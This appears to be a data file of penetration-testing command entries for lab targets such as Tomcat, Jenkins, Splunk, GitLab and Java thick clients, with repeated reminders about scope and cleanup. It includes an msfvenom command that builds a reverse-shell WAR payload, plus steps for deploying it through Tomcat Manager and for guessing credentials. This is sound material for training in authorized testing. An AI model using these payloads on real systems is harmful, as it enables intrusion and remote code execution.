entries.tip: This script is intrusive/brute-category NSE content, so keep it scoped and expect false positives until you validate paths manually.
entries.help_menu:
Why: HTB’s IIS tilde section is about turning short-name clues into real filenames.
Use after: confirming IIS and allowed testing scope.

entries.title: Run a Dedicated IIS Short Name Scan
entries.description: Use the dedicated Java scanner when Nmap shows tilde disclosure or you need deeper candidate recovery.
entries.tip: Start with a narrow path and compare results against normal 404/403 behavior before trusting candidate names.
entries.help_menu:
Why: the dedicated scanner can dig deeper into IIS 8.3 filename behavior.
Validate: recovered short names by targeted content discovery and manual requests.

entries.title: Check Tomcat Manager Credentials Carefully
entries.description: Validate a focused credential list against the Tomcat Manager path after you confirm lockout and scope expectations.
entries.tip: Use a tiny, justified list first. Tomcat Manager testing gets noisy quickly if you treat it like a generic password spray.
entries.help_menu:
Why: Tomcat Manager access often decides whether deployment testing is possible.
Check before: lockouts, default credentials policy, and whether /manager is reachable.

entries.title: List Tomcat Manager Applications
entries.description: Use the text manager endpoint to confirm credentials and see deployed paths without relying on the web UI.
entries.tip: The text endpoint is easier to save in notes and avoids confusing UI state with API-level authorization.
entries.help_menu:
Why: listing apps proves manager access and shows deployment paths.
Record: HTTP status, authenticated user context, and deployed paths.

entries.title: Build a Java WAR Payload for Lab Deployment
entries.description: Generate a WAR artifact when you have explicit authorization to validate a Tomcat-style deployment path.
entries.command: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o app.war
entries.tip: Tie the artifact to the lab target and delete it after validation. Payload generation should be purposeful, not casual.
entries.help_menu:
Why: Tomcat-style manager access can become code execution through deployment features.
Use only after: credentials, scope, and listener details are all clear.

entries.title: Deploy a WAR Through Tomcat Manager
entries.description: Upload a prepared WAR to the text API in an authorized lab so you can prove whether manager deployment is exposed.
entries.tip: Use a unique path, document it, and undeploy it when you are done testing.
entries.help_menu:
Why: deployment is the risky manager capability; test it only when it is the finding you need to prove.
Clean up: undeploy the app and save the response body.

entries.title: Download Jenkins CLI Client
entries.description: Pull the Jenkins-distributed CLI JAR from the target controller so CLI behavior matches the server version.
entries.tip: Re-download the JAR from the controller you are testing instead of reusing a stale local copy.
entries.help_menu:
Why: Jenkins distributes the CLI client from the controller itself.
Use for: permission checks, job listing, and scripted admin validation once authenticated.

entries.title: Check Jenkins CLI Identity and Jobs
entries.description: Use the CLI to confirm authenticated identity and enumerate visible jobs before testing higher-impact Jenkins features.
entries.command: java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth <USER>:<TOKEN> who-am-i && java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth <USER>:<TOKEN> list-jobs
entries.tip: Use API tokens where possible and save the permission output with the credentials source.
entries.help_menu:
Why: identity and job visibility shape every later Jenkins test.
Record: authenticated user, authorities, visible jobs, and CLI transport mode.

entries.title: Probe CGI Shellshock with a Harmless Command
entries.description: Run the Shellshock NSE script against a known CGI path with a benign command so you can validate exposure before impact testing.
entries.tip: Keep the command harmless until you have a stable signal and explicit permission to prove impact further.
entries.help_menu:
Why: CGI/Shellshock testing should start with controlled signal, not a full callback.
Use after: discovering a real CGI endpoint and confirming it is in scope.

entries.title: Request a Splunk Session Key
entries.description: Authenticate to Splunk’s management port and capture a session key for scoped REST API validation.
entries.tip: Management port 8089 is distinct from Splunk Web. Keep both endpoints straight in your notes.
entries.help_menu:
Why: Splunk REST access reveals role, app, and search capabilities through a cleaner interface than the UI.
Protect: session keys are credentials; do not paste them into general notes.

entries.title: List Visible Splunk Apps
entries.description: Use a Splunk session key to list app context and permissions that matter before any app-install validation.
entries.tip: Focus on app visibility and role capability before thinking about package upload paths.
entries.help_menu:
Why: Splunk authorization is capability-driven, and app visibility helps explain what the account can really do.
Record: role/capability evidence before higher-impact tests.

entries.title: Package a Minimal Splunk App
entries.description: Create a simple Splunk app archive for authorized install-path validation or defensive lab testing.
entries.tip: A valid Splunk app layout matters. Keep app.conf metadata readable and avoid packing extra parent directories.
entries.help_menu:
Why: Splunk app install testing starts with a well-formed package.
Check: default/app.conf, bin scripts, package root, and cleanup plan.

entries.title: List PRTG Sensors Through the API
entries.description: Use the PRTG HTTP API to enumerate sensors and object IDs once you have a valid API token.
entries.tip: Sensor names and notifications often reveal internal systems, service names, and operational trust boundaries.
entries.help_menu:
Why: PRTG is a monitoring product, so the API can expose a map of internal assets and service health.
Record: token source, object IDs, and any sensitive naming.

entries.title: Validate osTicket API Key Scope
entries.description: Send a minimal ticket creation request to confirm whether an osTicket API key is accepted from your source IP.
entries.tip: osTicket API keys are tied to source IP behavior, so note the network path used during testing.
entries.help_menu:
Why: helpdesk systems can contain sensitive conversations and upload flows.
Use carefully: avoid creating noisy tickets outside a lab or explicit test window.

entries.title: List GitLab Projects Available to a Token
entries.description: Use the GitLab API to see which projects a token can read before cloning or scanning repositories.
entries.tip: Token scope and project visibility are findings context; preserve both with the project list.
entries.help_menu:
Why: GitLab access often pivots from web auth into repository review.
Record: token source, token scope if known, project visibility, and project IDs.

entries.title: Clone a GitLab Repository with a Token
entries.description: Clone a repository for offline review when a scoped GitLab token has read_repository-style access.
entries.tip: Use a disposable workspace and remove tokens from shell history or remotes after cloning.
entries.help_menu:
Why: offline review makes it easier to search source, history, and CI configuration without poking the server repeatedly.
Cleanup: scrub token-bearing remote URLs from .git/config.

entries.title: Scan a Cloned Repository for Secrets
entries.description: Run Gitleaks against a cloned GitLab or exposed repository to triage committed secrets across current files and history.
entries.tip: Use redaction in shared notes, then store any confirmed secret evidence separately and carefully.
entries.help_menu:
Why: common app paths often move from repository access to credentials or CI secrets.
Confirm: whether each detected value is real, live, and in scope before reporting impact.

entries.title: Recover an Exposed .git Directory
entries.description: Dump as much of a web-exposed .git directory as possible into a local repository workspace for review.
entries.tip: The upstream README warns that attacker-controlled repositories can lead to local code execution; inspect in a disposable directory.
entries.help_menu:
Why: exposed .git folders can reveal source, history, and deleted secrets.
After dumping: inspect remotes, config, logs, and history before running project code.

entries.title: Find and Extract Exposed Git Repositories
entries.description: Use GitTools when you want the classic finder/dumper/extractor workflow for exposed .git repositories.
entries.tip: Keep the stages separate in your notes so you know which host exposed metadata and which one yielded recoverable source.
entries.help_menu:
Why: GitTools splits discovery, recovery, and object extraction into distinct steps.
Use when: directory listing is partial or you need to reconstruct history from objects.

entries.title: Capture Thick Client Traffic with tshark
entries.description: Record traffic for a thick client session so you can inspect protocols, ports, and request formats before modifying the client.
entries.tip: Capture first, then replay. The protocol details usually explain where decompilation effort should go.
entries.help_menu:
Why: thick clients often hide useful server routes and credentials in traffic, not just in code.
Record: target host, port, login flow, and any custom protocol behavior.

entries.title: Open a Java Client for Source Review
entries.description: Use JD-GUI for quick visual review of JAR or CLASS files when a Java thick client needs manual inspection.
entries.tip: Search for hostnames, ports, credentials, serializers, and request builders before changing code.
entries.help_menu:
Why: JD-GUI is fast for orientation and source browsing.
Use with: traffic captures so you can tie methods back to real requests.

entries.title: Decompile Java or Android Artifacts to a Folder
entries.description: Use jadx when you want searchable decompiled output from JAR, CLASS, APK, DEX, or related archive formats.
entries.tip: No decompiler is perfect. Use output as a map, then confirm behavior with runtime traffic and targeted tests.
entries.help_menu:
Why: searchable output is easier to grep, diff, and annotate than GUI-only review.
Look for: endpoints, auth material, crypto handling, and file operations.

entries.title: Inspect a JAR Manifest and Contents
entries.description: Use JDK tooling to list archive contents and pull the manifest before rebuilding or patching a Java client.
entries.command: jar tf <JAR_FILE> | sed -n "1,120p" && jar xf <JAR_FILE> META-INF/MANIFEST.MF && sed -n "1,120p" META-INF/MANIFEST.MF
entries.tip: The manifest often explains the main class and signing state before you touch any bytecode.
entries.help_menu:
Why: changing a signed JAR without understanding the manifest and META-INF files creates avoidable errors.
Record: Main-Class, classpath, and signature files.

entries.title: Compile and Rebuild a Modified Java Client
entries.description: Compile a changed class against the original client and rebuild a JAR after controlled source edits in a lab.
entries.tip: Make one change at a time and test that the client still launches before moving to vulnerability validation.
entries.help_menu:
Why: HTB thick-client workflows often require small client-side changes to reach hidden server behavior.
Check: Java version, package paths, manifest newline, and removed stale signature files.

entries.title: Probe Mass Assignment Fields
entries.description: Replay a normal JSON or form request while adding role, state, price, owner, or permission-style fields one at a time.
entries.command: In Repeater, compare the baseline request with added fields like isAdmin, role, accountType, price, owner_id, or status, then verify persisted state separately
entries.tip: Mass assignment is about server-side binding. A reflected field is not enough; confirm that state actually changed.
entries.help_menu:
Why: HTB mass-assignment style bugs usually come from hidden model fields accepted by the server.
Validate: create, update, read-back, and authorization boundaries.

entries.title: Run ColdFusion-Focused Templates
entries.description: Use tag-filtered Nuclei templates as a low-friction ColdFusion validation pass after fingerprinting CFIDE or Adobe ColdFusion clues.
entries.tip: Keep template output as leads and manually confirm version, endpoint, and exploitability.
entries.help_menu:
Why: ColdFusion surfaces are version-sensitive and template output needs careful confirmation.
Use after: WhatWeb/httpx fingerprints, CFIDE path checks, and scope review.
